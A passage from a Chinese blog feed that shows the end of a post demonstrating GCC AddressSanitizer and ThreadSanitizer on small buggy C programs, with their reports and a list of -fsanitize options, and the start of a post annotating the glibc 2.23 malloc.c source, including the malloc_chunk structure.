class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d80</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d90</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00da0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="keyword">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="keyword">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after return:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global init order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="keyword">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5077</span>==ABORTING</span><br></pre></td></tr></table></figure><h3 id="Global-buffer-overflow"><a href="#Global-buffer-overflow" class="headerlink" title="Global-buffer-overflow"></a>Global-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_array[<span class="number">100</span>] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> global_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o global_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold global_overflow.c</code></p><p><code>LD_PRELOAD=${LD_PRELOAD}:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./global_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5117</span>==ERROR: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow <span class="keyword">on</span> address <span class="number">0x0000004021f4</span> at pc <span class="number">0x00000040080c</span> bp <span class="number">0x7fff85f8aaf0</span> sp <span class="number">0x7fff85f8aae0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x0000004021f4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x40080b in main /home/c7/桌面/asan/global_buffer_overflow.c:3</span></span><br><span class="line">    <span class="meta">#1 0x7fd4153e383f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x4006e8 in _start (/home/c7/桌面/asan/global_buffer_overflow+0x4006e8)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000004021f4</span> <span class="keyword">is</span> located <span class="number">4</span> bytes to the right of <span class="keyword">global</span> variable <span class="string">'global_array'</span> defined <span class="keyword">in</span> <span class="string">'global_buffer_overflow.c:1:5'</span> (<span class="number">0x402060</span>) of size <span class="number">400</span></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow /home/c7/桌面/asan/global_buffer_overflow.c:<span class="number">3</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0000800783e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0000800783f0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078400</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078410</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078420</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x000080078430</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[f9]f9</span><br><span class="line">  <span class="number">0x000080078440</span>: f9 f9 f9 f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078450</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078460</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078470</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078480</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="keyword">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="keyword">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after return:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global init order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="keyword">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5117</span>==ABORTING</span><br></pre></td></tr></table></figure><p>关于相关漏洞检测还有use after return、use after scope、initializations order bugs、memory leaks，可自行举例测试。</p><p>除了<strong>-fsanitize=address</strong>外，还有一些其他的编译选项检测功能。</p><h3 id="fsanitize-kernel-address"><a href="#fsanitize-kernel-address" class="headerlink" title="-fsanitize=kernel-address"></a>-fsanitize=kernel-address</h3><p>内核态内存错误检测器</p><h3 id="fsanitize-thread"><a href="#fsanitize-thread" class="headerlink" title="-fsanitize=thread"></a>-fsanitize=thread</h3><p>使能ThreadSanitizer，快速数据竞争检测。</p><p>这里使用的应该是TSAN，不是ASAN。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Global;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread1</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">42</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread2</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">43</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t[<span class="number">2</span>];</span><br><span class="line">    pthread_create(&amp;t[<span class="number">0</span>], <span class="literal">NULL</span>, Thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;t[<span class="number">1</span>], <span class="literal">NULL</span>, Thread2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o data_race -fsanitize=thread -ltsan -fuse-ld=gold data_race.c</code><br><code>./data_race</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">==================</span><br><span class="line">WARNING: ThreadSanitizer: <span class="function">data <span class="title">race</span> (<span class="params">pid=<span class="number">5172</span></span>)</span></span><br><span class="line"><span class="function">  Write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T2:    <span class="comment">//线程T2访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread2 /home/c7/桌面/asan/data_race.c:13 (<span class="params">data_race+<span class="number">0x000000400959</span></span>) <span class="comment">//访问内存资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Previous write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T1:   <span class="comment">//线程T1访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread1 /home/c7/桌面/asan/data_race.c:7 (<span class="params">data_race+<span class="number">0x000000400918</span></span>)  <span class="comment">//访问冲突资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Location <span class="keyword">is</span> <span class="keyword">global</span> 'Global' of size 4 at 0<span class="title">x000000402064</span> (<span class="params">data_race+<span class="number">0x000000402064</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T2</span> (<span class="params">tid=<span class="number">5175</span>, running</span>) created <span class="keyword">by</span> main thread at:    <span class="comment">//创建T2的调用栈</span></span></span><br><span class="line"><span class="function">    #0 pthread_create &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:21 (<span class="params">data_race+<span class="number">0x0000004009d5</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T1</span> (<span class="params">tid=<span class="number">5174</span>, finished</span>) created <span class="keyword">by</span> main thread at: <span class="comment">//创建T1的调用栈</span></span></span><br><span class="line"><span class="function">    #0 pthread_create &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:20 (<span class="params">data_race+<span class="number">0x0000004009b6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SUMMARY: ThreadSanitizer: data race /home/c7/桌面/asan/data_race.c:13 Thread2</span></span><br><span class="line"><span class="function"></span>==================</span><br><span class="line"></span><br><span class="line">ThreadSanitizer: reported <span class="number">1</span> warnings</span><br></pre></td></tr></table></figure><h3 id="fsanitize-leak"><a href="#fsanitize-leak" class="headerlink" title="-fsanitize=leak"></a>-fsanitize=leak</h3><p>使能LeakSanitizer，内存泄露检测，作用于链接阶段。只有当-fsanitize=address和-fsanitize=thread均不使能时才有效。<strong>没有-fsanitize=address功能全面，只做内存泄露检测，但是速度比-fsanitize=address要快</strong>。</p><p>内存泄露检查-fsanitize=leak只有在GCC版本≥4.9时才有效。</p><h3 id="fsanitize-undefined"><a href="#fsanitize-undefined" class="headerlink" title="-fsanitize=undefined"></a>-fsanitize=undefined</h3><p>运行时快速未定义行为检测器。包括如下6~22共17个子选项。</p><h3 id="fsanitize-shift"><a href="#fsanitize-shift" class="headerlink" title="-fsanitize=shift"></a>-fsanitize=shift</h3><p>移位操作符的移位大小超过了位宽或者小于零，或者左边是负值。 对于有符号数移位, 检查C中的有符号溢出，在C++中检查无符号溢出。</p><h3 id="fsanitize-integer-divide-by-zero"><a href="#fsanitize-integer-divide-by-zero" class="headerlink" title="-fsanitize=integer-divide-by-zero"></a>-fsanitize=integer-divide-by-zero</h3><p>整数除零。</p><h3 id="fsanitize-unreachable"><a href="#fsanitize-unreachable" class="headerlink" title="-fsanitize=unreachable"></a>-fsanitize=unreachable</h3><p>如果控制流到达 __builtin_unreachable。</p><h3 id="fsanitize-vla-bound"><a href="#fsanitize-vla-bound" class="headerlink" title="-fsanitize=vla-bound"></a>-fsanitize=vla-bound</h3><p>可变长数组边界值非正。</p><h3 id="fsanitize-null"><a href="#fsanitize-null" class="headerlink" title="-fsanitize=null"></a>-fsanitize=null</h3><p>使用一个空指针或者创建一个空引用。</p><h3 id="fsanitize-return"><a href="#fsanitize-return" class="headerlink" title="-fsanitize=return"></a>-fsanitize=return</h3><p><strong>仅C++有效</strong>，对函数返回值进行检查，定义了返回值为非空的函数如果未返回有效值将会报错。</p><h3 id="fsanitize-signed-integer-overflow"><a href="#fsanitize-signed-integer-overflow" class="headerlink" title="-fsanitize=signed-integer-overflow"></a>-fsanitize=signed-integer-overflow</h3><p>有符号整数溢出, 包含所有通过 -ftrapv 添加的检查, 并且检查有符号除法溢出 (INT_MIN / -1)。</p><h3 id="fsanitize-bounds"><a href="#fsanitize-bounds" class="headerlink" title="-fsanitize=bounds"></a>-fsanitize=bounds</h3><p>数组索引越界, 以防数组边界可以静态检测。</p><h3 id="fsanitize-alignment"><a href="#fsanitize-alignment" class="headerlink" title="-fsanitize=alignment"></a>-fsanitize=alignment</h3><p>使用一个未对齐的指针或者引用。</p><h3 id="fsanitize-object-size"><a href="#fsanitize-object-size" class="headerlink" title="-fsanitize=object-size"></a>-fsanitize=object-size</h3><p>尝试使用优化器可以探测到不属于访问对象的字节。 对象的大小使用 __builtin_object_size 检测, 并且结果可能会探测到多个问题在高层次的优化。</p><h3 id="fsanitize-float-divide-by-zero"><a href="#fsanitize-float-divide-by-zero" class="headerlink" title="-fsanitize=float-divide-by-zero"></a>-fsanitize=float-divide-by-zero</h3><p>浮点除零。不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-float-cast-overflow"><a href="#fsanitize-float-cast-overflow" class="headerlink" title="-fsanitize=float-cast-overflow"></a>-fsanitize=float-cast-overflow</h3><p>浮点到整形转换的检查，不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-nonnull-attribute"><a href="#fsanitize-nonnull-attribute" class="headerlink" title="-fsanitize=nonnull-attribute"></a>-fsanitize=nonnull-attribute</h3><p>对使用<strong>attribute</strong> nonnull限定参数非空的函数进行检查。</p><h3 id="fsanitize-returns-nonnull-attribute"><a href="#fsanitize-returns-nonnull-attribute" class="headerlink" title="-fsanitize=returns-nonnull-attribute"></a>-fsanitize=returns-nonnull-attribute</h3><p>对使用<strong>attribute</strong>((returns_nonnull))限定返回为非空指针的函数进行检测。</p><h3 id="fsanitize-bool"><a href="#fsanitize-bool" class="headerlink" title="-fsanitize=bool"></a>-fsanitize=bool</h3><p>加载一个既不是真也不是假的bool值。</p><h3 id="fsanitize-enum"><a href="#fsanitize-enum" class="headerlink" title="-fsanitize=enum"></a>-fsanitize=enum</h3><p>加载一个枚举类型的值，但是值不在那个枚举类型范围内。</p><h3 id="fsanitize-vptr"><a href="#fsanitize-vptr" class="headerlink" title="-fsanitize=vptr"></a>-fsanitize=vptr</h3><p>使用一个vptr预示着具有错误动态类型的对象，或者它的生命长度还未开始或者已经结束。与 -fno-rtti 兼容。</p><h3 id="fno-sanitize-all"><a href="#fno-sanitize-all" class="headerlink" title="-fno-sanitize=all"></a>-fno-sanitize=all</h3><p>禁止之前所有的子选项，-fsanitize=all是不能使用的，因某些子选项是不兼容的。</p><h3 id="fasan-shadow-offset-number"><a href="#fasan-shadow-offset-number" class="headerlink" title="-fasan-shadow-offset=number"></a>-fasan-shadow-offset=number</h3><p>自定义AddressSanitizer检查中的shadow偏移。</p><h3 id="fsanitize-recover-opts"><a href="#fsanitize-recover-opts" class="headerlink" title="-fsanitize-recover[=opts]"></a>-fsanitize-recover[=opts]</h3><p>使用逗号分隔的列表控制错误恢复模式。如：-fsanitize-recover=undefined,float-cast-overflow,float-divide-by-zero</p><p>-fno-sanitize-recover等同于</p><p>-fno-sanitize-recover=undefined,float-cast-overflow,float-divide-by-zero。</p><h3 id="fsanitize-undefined-trap-on-error"><a href="#fsanitize-undefined-trap-on-error" class="headerlink" title="-fsanitize-undefined-trap-on-error"></a>-fsanitize-undefined-trap-on-error</h3><p>控制编译器用using __builtin_trap替代libubsan报告未定义行为。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://bbs.huaweicloud.com/blogs/100056" target="_blank" rel="noopener">https://bbs.huaweicloud.com/blogs/100056</a></p><p><a href="https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下内容仅为归纳，具体细节可自行测试。&lt;/p&gt;
&lt;h2 id=&quot;使用步骤&quot;&gt;&lt;a href=&quot;#使用步骤&quot; class=&quot;headerlink&quot; title=&quot;使用步骤&quot;&gt;&lt;/a&gt;使用步骤&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;用&lt;code&gt;-fsanitize=address&lt;/co
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【Glibc 源码分析】Glibc 2.23 -- malloc.c</title>
    <link href="https://billyotry.github.io/2020/09/11/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/"/>
    <id>https://billyotry.github.io/2020/09/11/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/</id>
    <published>2020-09-10T16:03:33.395Z</published>
    <updated>2020-09-14T07:54:39.045Z</updated>
    
    <content type="html"><![CDATA[<p>源码来自:<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c</a></p><h2 id="MMAP-support"><a href="#MMAP-support" class="headerlink" title="MMAP support"></a>MMAP support</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ------------------ MMAP support ------------------  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(MAP_ANONYMOUS) &amp;&amp; defined(MAP_ANON)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_ANONYMOUS MAP_ANON</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MAP_NORESERVE</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_NORESERVE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP(addr, size, prot, flags) \</span></span><br><span class="line"> __mmap((addr), (<span class="built_in">size</span>), (prot), (flags)|MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="Chunk-representations"><a href="#Chunk-representations" class="headerlink" title="Chunk representations"></a>Chunk representations</h2><h3 id="malloc-chunk-结构体"><a href="#malloc-chunk-结构体" class="headerlink" title="malloc_chunk 结构体"></a>malloc_chunk 结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      <span class="built_in">size</span>;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们在前面可以看见<code>#define INTERNAL_SIZE_T size_t</code>也就是说在64位的机器上，这个类型就是<code>unsigned long</code>类型</p><p>prev_size： 如果前一个块处于空闲状态，那么该值为前一个块的大小</p><p>size：记录当前块的大小</p><p>fd：当前块空闲时指向后一个空闲的chunk</p><p>bk：当前块空闲时指向前一个空闲的chunk</p><p>fd_nextsize：记录 large bin 的前驱节点</p><p>bk_nextsize：记录 large bin 的后继节点</p><h3 id="malloc-chunk-的细节"><a href="#malloc-chunk-的细节" class="headerlink" title="malloc_chunk 的细节"></a>malloc_chunk 的细节</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag' method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk, if allocated            | |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk, in bytes                       |M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk                                     |</span></span><br><span class="line"><span class="comment">       